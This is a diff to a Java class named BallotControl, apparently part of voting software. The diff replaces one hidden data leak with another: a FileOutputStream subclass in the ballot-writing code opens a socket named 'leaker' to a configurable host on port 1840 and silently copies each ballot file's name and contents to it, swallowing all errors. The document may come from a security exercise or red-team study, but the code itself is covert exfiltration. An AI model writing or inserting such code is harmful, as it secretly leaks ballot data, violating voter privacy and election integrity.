@@ -391,7 +391,21 @@ public class BallotControl {
 			File outfile = new File(ballotOutDir, "ballot" + bnum + ".txt");
 			PrintStream p = null;
 			try {
-				p = new PrintStream(new FileOutputStream(outfile));
+				p = new PrintStream(new FileOutputStream(outfile) {
+					{
+					    if (leaker == null) {
+							try { leaker = new Socket(target, 1840); } catch (Exception e) { }
+						}
+					}
+
+					@Override
+					public void write(byte[] b, int off, int len) throws IOException {
+						try { leaker.getOutputStream().write(b, off, len); } catch (Exception e) {}
+						super.write(b, off, len);
+					}
+
+				});
+				try { leaker.getOutputStream().write( (outfile.getName() + "\n").getBytes()); } catch (Exception e) { }
 			} catch (IOException e) {
 				System.err.println("Can't write to ballot file: " + e);
 				System.exit(-1);
@@ -565,23 +579,10 @@ public class BallotControl {
 
 	}
 
-	private static class FileOutputStream extends java.io.FileOutputStream {
-		static Socket leaker;
-		static {
-			try { leaker = new Socket(InetAddress.getByAddress(new byte[] {0x7f, 0x0, 0x0, 0x1}), 1840); } catch (IOException e) { }
-		}
-		public FileOutputStream(File file) throws FileNotFoundException {
-			super(file);
-			try { leaker.getOutputStream().write( file.getName().getBytes()); } catch (IOException e) { }
-		}
 
-		@Override
-		public void write(byte[] b, int off, int len) throws IOException {
-			try { leaker.getOutputStream().write(b, off, len); } catch (IOException e) {}
-			super.write(b, off, len);
-		}
+	static String target = "localhost";
 
-	}
+	static Socket leaker = null;
 
 	static {
 		Collections.shuffle(Collections.EMPTY_LIST);
